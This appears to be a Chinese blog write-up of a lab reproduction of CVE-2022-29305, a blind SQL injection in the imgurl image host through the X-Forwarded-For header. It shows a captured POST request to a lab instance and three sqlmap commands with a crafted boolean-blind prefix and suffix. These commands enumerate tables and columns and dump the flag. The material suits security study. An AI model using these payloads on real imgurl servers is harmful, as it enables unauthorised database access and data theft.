---
title: CVE-2022-29305【SQL 注入】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'SQL 注入'
---

## 1. 漏洞介绍

[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2022-29305)

## 2. 漏洞分析

[Blind SQL Injection Vulnerability · Issue #75 · helloxz/imgurl · GitHub](https://github.com/helloxz/imgurl/issues/75)

对获取的IP未做过滤，转义等，直接将ip拼接到了sql语句中。

## 3. 漏洞复现

开启环境后用 burpsuite 抓包，由漏洞原理知注入点在获取 IP 的字段，后面以 `x-forwarded-for: ` 为例

示例

```http
POST http://eci-2zegbbx5ie07dgjzp6lh.cloudeci1.ichunqiu.com/upload/localhost HTTP/1.1
Host: eci-2zegbbx5ie07dgjzp6lh.cloudeci1.ichunqiu.com
Content-Length: 0
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryA8Uy4gNxUJfICo01
Origin: http://eci-2zegbbx5ie07dgjzp6lh.cloudeci1.ichunqiu.com
Referer: http://eci-2zegbbx5ie07dgjzp6lh.cloudeci1.ichunqiu.com/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1694490097; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1694490097
x-forwarded-for:  
Connection: close
```

注，`x-forwarded-for: ` 是自己加上去的 

sqlmap 指令

```bash
#表
python sqlmap.py -r post.txt -p x-forwarded-for --prefix="' union select case((1=1) and " --suffix=")when(1)then(10)else(0)end order by num desc-- " -level 3 -risk 3 --dbms sqlite -technique=B --text-only --tables
#列
python sqlmap.py -r post.txt -p x-forwarded-for --prefix="' union select case((1=1) and " --suffix=")when(1)then(10)else(0)end order by num desc-- " -level 3 -risk 3 --dbms sqlite -technique=B --text-only -T flag --columns
#flag
python sqlmap.py -r post.txt -p x-forwarded-for --prefix="' union select case((1=1) and " --suffix=")when(1)then(10)else(0)end order by num desc-- " -level 3 -risk 3 --dbms sqlite -technique=B --text-only -T flag -C flag --dump
```

效果

![1.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309121333873.jpg)

